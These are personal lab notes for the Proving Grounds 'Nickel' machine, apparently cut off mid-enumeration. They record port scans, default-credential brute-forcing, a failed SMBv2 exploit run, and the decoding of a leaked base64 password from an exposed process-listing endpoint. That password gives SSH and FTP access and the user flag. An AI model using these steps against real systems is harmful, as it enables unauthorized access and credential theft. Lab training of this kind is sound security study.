# Nickel

# Plan

## 21 - FTP FileZilla Server 0.9.60 beta
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [x] Hacktricks https://book.hacktricks.xyz/pentesting/pentesting-ftp
	- [ ] FTP Bounce Attack

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
	- [ ] Remote denial of Service - Useless
- [ ] Google
- [ ] More

Logging in
- [x] Anonymous/ Null Login - **Doesn't work**
Brute Force `I` 
- [x] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup`
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

## 22 - OpenSSH for_Windows_8.1

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

Logging in
Brute Force `I` 
- [x] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup` - Nope
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

## 135 - Microsoft Windows RPC



## 139 - Microsoft Windows netbios-ssn


Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
	- [x] smb-vuln-cve2009-3103 - Doesn't work
- [ ] More

Logging in
Brute Force `I` 
- [ ] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup`
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More


## 3389 - RDP

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

Logging in
Brute Force `I` 
- [ ] `admin` : `admin`, `admin`:`password`, `guest`:`guest`, `backup`:`backup`
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

## 8089 - HTTPAPI

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

**Basic**

Source Code `E`
- [ ] Find all the files, hidden or not (if possible)
- [ ] Look through the source code of ALL the files
    - [ ] Find all Input Fields `-> Input Fields`
    - [ ] File Uploads `-> File upload`

Directory Enumeration (dirb) `I -> Custom page/ CMS`
- [ ] Sitemap (robots.txt)
- [ ] Common wordlist
- [ ] big wordlist
- [ ] More

Virtual Hosts Testing `I`
- [ ] Given hostname - No Given
- [ ] Hostname derived from box name - *banzai.pg* - No Diff
- [ ] More

Vulnerability Scanning `I`
- [ ] Nikto Vulnerability Scanner
- [ ] More


## 33333 - HTTPAPI
Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

**Basic**

Source Code `E`
- [ ] Find all the files, hidden or not (if possible)
- [ ] Look through the source code of ALL the files
    - [ ] Find all Input Fields `-> Input Fields`
    - [ ] File Uploads `-> File upload`

Directory Enumeration (dirb) `I -> Custom page/ CMS`
- [ ] Sitemap (robots.txt)
- [ ] Common wordlist
- [ ] big wordlist
- [ ] More

Virtual Hosts Testing `I`
- [ ] Given hostname - No Given
- [ ] Hostname derived from box name - *banzai.pg* - No Diff
- [ ] More

Vulnerability Scanning `I`
- [ ] Nikto Vulnerability Scanner
- [ ] More




# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Sun Jan 16 05:45:36 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel/results/192.168.225.99/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel/results/192.168.225.99/scans/xml/_full_tcp_nmap.xml" 192.168.225.99
adjust_timeouts2: packet supposedly had rtt of -247887 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -247887 microseconds.  Ignoring time.
Nmap scan report for 192.168.225.99
Host is up, received user-set (0.24s latency).
Scanned at 2022-01-16 05:45:37 EST for 350s
Not shown: 65528 filtered ports
Reason: 65528 no-responses
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYR4Bx82VWETlsjIFs21j6lZ6/S40jMJvuXF+ay4Qz4b+ws2YobB5h0+IrHdr3epMNFmSY8JXFWzIILhkvF/rmadXRtGwib1VZkSa3nr5oYdMajoWK0jOVSoFJmDTJvhj+T3XE7+Q0tEkQ2EeGPrz7nK5XWzBp8SZdywCE/iz1HLvUIlsOqpDWHSjrnjkUaaleTgoVTEi63Dx4inY2KS5mX2mnS/mLzMlLZ0qj8vL9gz6ZJgf7LMNhXb/pWOtxfn6zmSoVHXEXgubXwLtrn4wOIvbZkm5/uEx+eFzx1AOEQ2LjaKItEqLlP3E5sdutVP6yymDTGBtlXgfvtfGS2lgZiitorAXjjND6Sqcppp5lQJk2XSBJC58U0SzjXdyflJwsus5mnKnX79nKxXPNPwM6Z3Ki1O9vE+KsJ1dZJuaTINVgLqrgwJ7BCkI2HyojfqzjHs4FlYVHnukjqunG90OMyAASSR0oEnUTPqFmrtL/loEc3h44GT+8m9JS1LgdExU=
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJYE805huwKUl0fJM8+N9Mk7GUQeEEc5iA/yYqgxE7Bwgz4h5xufRONkR6bWxcxu8/AHslwkkDkjRKNdr4uFzY=
|   256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL8cLYuHBTVFfYPb/YzUIyT39bUzA/sPDFEC/xChZyZ4
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2022-01-16T10:50:19+00:00
| ssl-cert: Subject: commonName=nickel
| Issuer: commonName=nickel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-01-15T10:44:55
| Not valid after:  2022-07-17T10:44:55
| MD5:   8296 c628 9f00 3a2b 6ddb 594e 0281 cb0f
| SHA-1: 822e 9680 5729 7d97 d76c d23c 60b5 83e5 9b94 0013
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIQXxTaaHntc6RG6qwReBQG+DANBgkqhkiG9w0BAQsFADAR
| MQ8wDQYDVQQDEwZuaWNrZWwwHhcNMjIwMTE1MTA0NDU1WhcNMjIwNzE3MTA0NDU1
| WjARMQ8wDQYDVQQDEwZuaWNrZWwwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
| AoIBAQDly/vmp00kCX31dd9QTeRGu3ItdtQNYM4TJrK99vAuh5uDYWlr5f6VRUZb
| toKy2GCJLwTATLU7GOiOu/Q1asag3CitGi01gq23WEkOgrBW2+AyKi38R1+hYsFn
| 1wHH5HlUbTQN33yhDVXwPdxnqXh1oAiCBvOOZfBSiAgWTUBooA7YM9tJVmtkT+bi
| DYaG3ZF4RS3shMquqEg9490Tto4RN3USeuzLEDZXLAiQeapL3ZbPcNGZHEWPduZN
| 6yfEryzOh535Kg6Nkte/aapnwit/HFJN/drCKxciizU+/ahUOXVvmuSppInMVftT
| bj01sS5csyHdOKetsc16+OsRg+6dAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAXO/WHNHNEWpp5eQY
| GWEhYKEkrWYAQ+xzPO7B08Pn6+0wRu+PgW1YCPVffwqxWwRm61zF+pH5eFnNtbum
| Xu91sx9tadJZ57Z6kZvDrIgZaoWO8LtIyXn1BuFrpwbZ92tzfkvL72rtcI9GHggg
| lGdrjUIsQ4ZaX8z/s9tQ917Ut+dpUit2qDgPVwKrzNNPDKU9LcvsVG8iLW/NyaEG
| GnYQuVxlkOc7WrLrmebJOwFpR9d3NV1pfb/csbAnNjUi8ENjMNFBjytP/BLCqKKJ
| lkIsNJn8IwF+JPouNMFCXBJnYa0eTTgOiSiMXXKDboNMBx6YMbQxlDdW2khkddcU
| L7kQvg==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-16T10:51:27+00:00; +2s from scanner time.
8089/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|98 (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_98
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (88%), Microsoft Windows 98 SE (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/16%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E3F8AF%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=108%TS=U)
SEQ(SP=103%GCD=1%ISR=107%II=I%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51811/tcp): CLEAN (Timeout)
|   Check 2 (port 10967/tcp): CLEAN (Timeout)
|   Check 3 (port 27269/udp): CLEAN (Timeout)
|   Check 4 (port 59903/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   244.42 ms 192.168.49.1
2   244.52 ms 192.168.225.99

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 05:51:27 2022 -- 1 IP address (1 host up) scanned in 351.69 seconds

```

### Vuln

```
┌──(kali㉿kali)-[~]
└─$ nmap --script vuln -p 21,22,3389,8089,33333,139,135 192.168.225.99  -v -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-16 06:20 EST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:20
Completed NSE at 06:20, 10.05s elapsed
Initiating NSE at 06:20
Completed NSE at 06:20, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:20
Completed Parallel DNS resolution of 1 host. at 06:20, 0.02s elapsed
Initiating Connect Scan at 06:20
Scanning 192.168.225.99 [7 ports]
Discovered open port 22/tcp on 192.168.225.99
Discovered open port 135/tcp on 192.168.225.99
Discovered open port 3389/tcp on 192.168.225.99
Discovered open port 139/tcp on 192.168.225.99
Discovered open port 21/tcp on 192.168.225.99
Discovered open port 33333/tcp on 192.168.225.99
Discovered open port 8089/tcp on 192.168.225.99
Completed Connect Scan at 06:20, 0.32s elapsed (7 total ports)
NSE: Script scanning 192.168.225.99.
Initiating NSE at 06:20
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
Completed NSE at 06:22, 70.06s elapsed
Initiating NSE at 06:22
Completed NSE at 06:22, 0.00s elapsed
Nmap scan report for 192.168.225.99
Host is up (0.32s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
|_sslv2-drown: 
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
3389/tcp  open  ms-wbt-server
|_sslv2-drown: 
8089/tcp  open  unknown
33333/tcp open  dgi-serv

Host script results:
|_samba-vuln-cve-2012-1182: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

NSE: Script Post-scanning.
Initiating NSE at 06:22
Completed NSE at 06:22, 0.00s elapsed
Initiating NSE at 06:22
Completed NSE at 06:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 80.81 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 21 - FTP

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nickel]
└─$ ftp 192.168.225.99                                                  
Connected to 192.168.225.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.225.99:kali): anonymous
331 Password required for anonymous
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> user admin
421 Login time exceeded. Closing control connection.
Login failed.
ftp> exit
```

Failed Credentials

```
anonymous
admin:admin
admin:password
guest:guest
backup:backup
nickel:nickel
```

## 22 - SSH

## 135 - MSRPC

```bash
┌──(kali㉿kali)-[~]
└─$ rpcclient -p 135 -U "" 192.168.140.99
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

## 139 - SMB

```bash
┌──(kali㉿kali)-[~]
└─$ smbmap -H 192.168.140.99 -P 139                     
[!] RPC Authentication error occurred
[!] Authentication error on 192.168.140.99
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

### Exploit Testing

Same as helpdesk

```
┌──(kali㉿kali)-[/tmp]
└─$ python 40280.py 192.168.225.99 1                                                                                                                            1 ⨯ 1 ⚙
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 362 bytes
Final size of python file: 1767 bytes
Traceback (most recent call last):
  File "40280.py", line 81, in <module>
    s.connect(host)
  File "/usr/lib/python2.7/socket.py", line 228, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 110] Connection timed out
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$                       
```

## 8089 - Web

### Direnum

```javascript
┌──(kali㉿kali)-[~]
└─$ wfuzz --hh 9 -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt http://192.168.140.99:8089/FUZZ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.140.99:8089/FUZZ
Total requests: 20116

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================

000004255:   200        13 L     33 W       471 Ch      "http://192.168.140.99:8089/"                                                                          
000015508:   400        6 L      26 W       324 Ch      ".."                                                                                                   
000019817:   400        6 L      26 W       324 Ch      ".."                                                                                                   

Total time: 384.4537
Processed Requests: 20116
Filtered Requests: 20113
Requests/sec.: 52.32358

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

![](Pasted%20image%2020220220161518.png)

```html
<h1>DevOps Dashboard</h1>
<hr>
<form action='http://169.254.129.67:33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://169.254.129.67:33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://169.254.129.67:33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>
```

## 33333 - Web

![](Pasted%20image%2020220220161538.png)


```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/list-current-deployments                                                
<p>Cannot "GET" /list-current-deployments</p>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/list-running-procs      
<p>Cannot "GET" /list-running-procs</p>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/list-active-nodes 
<p>Cannot "GET" /list-active-nodes</p>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/l                
<p>Not Found</p>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

POST everything

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/list-running-procs  --data ''                                                                                            130 ⨯ 1 ⚙


name        : System Idle Process
commandline : 

name        : System
commandline : 

name        : Registry
commandline : 

name        : smss.exe
commandline : 

name        : csrss.exe
commandline : 

name        : wininit.exe
commandline : 

name        : csrss.exe
commandline : 

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline : 

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : dwm.exe
commandline : "dwm.exe"

name        : upfc.exe
commandline : 

name        : Memory Compression
commandline : 

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

name        : spoolsv.exe
commandline : C:\Windows\System32\spoolsv.exe

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{7FEB721E-FA96-43CA-B48C-E9904E884599}

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa3940855 /state1:0x41c64e6d

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : VSSVC.exe
commandline : C:\Windows\system32\vssvc.exe

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : SgrmBroker.exe
commandline : 

name        : sppsvc.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : usocoreworker.exe
commandline : C:\Windows\System32\usocoreworker.exe -Embedding

name        : SppExtComObj.Exe
commandline : C:\Windows\system32\SppExtComObj.exe -Embedding

name        : WmiApSrv.exe
commandline : C:\Windows\system32\wbem\WmiApSrv.exe

name        : CompatTelRunner.exe
commandline : C:\Windows\system32\compattelrunner.exe

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : SearchProtocolHost.exe
commandline : "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe1_ 
              Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 
              (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" 
              "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 

name        : SearchFilterHost.exe
commandline : "C:\Windows\system32\SearchFilterHost.exe" 0 780 784 792 8192 788 

name        : taskhostw.exe
commandline : taskhostw.exe None



                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/list-active-nodes  --data ''                                                                                                   1 ⚙
<p>Not Implemented</p>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.140.99:33333/list-current-deployments  --data ''                                                                                            1 ⚙
<p>Not Implemented</p>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$   
```

# Exploitation

```bash
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d                                                                                                                 1 ⨯
NowiseSloopTheory139
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

┌──(kali㉿kali)-[~]
└─$ crackmapexec ssh 192.168.140.99 -u ariah -p NowiseSloopTheory139                                                                                              130 ⨯
SSH         192.168.140.99  22     192.168.140.99   [*] SSH-2.0-OpenSSH_for_Windows_8.1
SSH         192.168.140.99  22     192.168.140.99   [+] ariah:NowiseSloopTheory139 
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ssh ariah@192.168.140.99                      
ariah@192.168.140.99's password: 
Microsoft Windows [Version 10.0.18362.1016]         
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
ariah@NICKEL C:\Users\ariah> # Password is NowiseSloopTheory139
'#' is not recognized as an internal or external command,
operable program or batch file.                          
                                                         
ariah@NICKEL C:\Users\ariah>dir                          
 Volume in drive C has no label.                  
 Volume Serial Number is 9451-68F7                
                                                  
 Directory of C:\Users\ariah                      
                                                  
10/15/2020  06:23 AM    <DIR>          .          
10/15/2020  06:23 AM    <DIR>          ..         
10/15/2020  06:23 AM    <DIR>          3D Objects 
10/15/2020  06:23 AM    <DIR>          Contacts   
10/15/2020  06:24 AM    <DIR>          Desktop
10/15/2020  06:23 AM    <DIR>          Documents
10/15/2020  06:23 AM    <DIR>          Downloads
10/15/2020  06:23 AM    <DIR>          Favorites
10/15/2020  06:23 AM    <DIR>          Links
10/15/2020  06:23 AM    <DIR>          Music
10/15/2020  06:25 AM    <DIR>          Pictures
10/15/2020  06:23 AM    <DIR>          Saved Games
10/15/2020  06:24 AM    <DIR>          Searches
10/15/2020  06:23 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   8,140,083,200 bytes free

ariah@NICKEL C:\Users\ariah>cd Desktop

ariah@NICKEL C:\Users\ariah\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users\ariah\Desktop

10/15/2020  06:24 AM    <DIR>          .
10/15/2020  06:24 AM    <DIR>          ..
02/20/2022  01:44 AM                34 local.txt
10/15/2020  06:24 AM             1,450 Microsoft Edge.lnk
               2 File(s)          1,484 bytes
               2 Dir(s)   8,140,083,200 bytes free

ariah@NICKEL C:\Users\ariah\Desktop>type local.txt
242ec63b16f32d87a72985fef4130d87

ariah@NICKEL C:\Users\ariah\Desktop>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::bd35:8507:9670:da7%4
   IPv4 Address. . . . . . . . . . . : 192.168.140.99
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.140.254

ariah@NICKEL C:\Users\ariah\Desktop>
```

![](Pasted%20image%2020220220180744.png)

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.140.99
Connected to 192.168.140.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (192.168.140.99:kali): ariah
331 Password required for ariah
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/"
-r--r--r-- 1 ftp ftp          46235 Sep 01  2020 Infrastructure.pdf
226 Successfully transferred "/"
ftp> lcd /tmp
Local directory now /tmp
ftp> put winPEAS.bat
local: winPEAS.bat remote: winPEAS.bat
200 Port command successful
550 Permission denied
ftp> 
ftp> binary
200 Type set to I
ftp> get Infrastructure.pdf
local: Infrastructure.pdf remote: Infrastructure.pdf
200 Port command successful
150 Opening data channel for file download from server of "/Infrastructure.pdf"
226 Successfully transferred "/Infrastructure.pdf"
46235 bytes received in 0.55 secs (82.1844 kB/s)
ftp> exit
221 Goodbye
```

# Privesc

## Enum files

```powershell
ariah@NICKEL C:\Users\ariah\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users\ariah\Desktop

10/15/2020  06:24 AM    <DIR>          .
10/15/2020  06:24 AM    <DIR>          ..c
02/20/2022  01:44 AM                34 local.txt
10/15/2020  06:24 AM             1,450 Microsoft Edge.lnk
               2 File(s)          1,484 bytes
               2 Dir(s)   8,138,248,192 bytes free

ariah@NICKEL C:\Users\ariah\Desktop>cd \ 

ariah@NICKEL C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\

09/01/2020  11:38 AM    <DIR>          ftp
09/01/2020  11:04 AM    <DIR>          PerfLogs
10/19/2020  07:39 AM    <DIR>          Program Files
09/01/2020  11:38 AM    <DIR>          Program Files (x86)
09/01/2020  11:38 AM    <DIR>          Users
09/01/2020  11:36 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   8,138,739,712 bytes free

ariah@NICKEL C:\>cd ftp

ariah@NICKEL C:\ftp>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\ftp

09/01/2020  11:38 AM    <DIR>          .
09/01/2020  11:38 AM    <DIR>          ..
09/01/2020  10:02 AM            46,235 Infrastructure.pdf
               1 File(s)         46,235 bytes
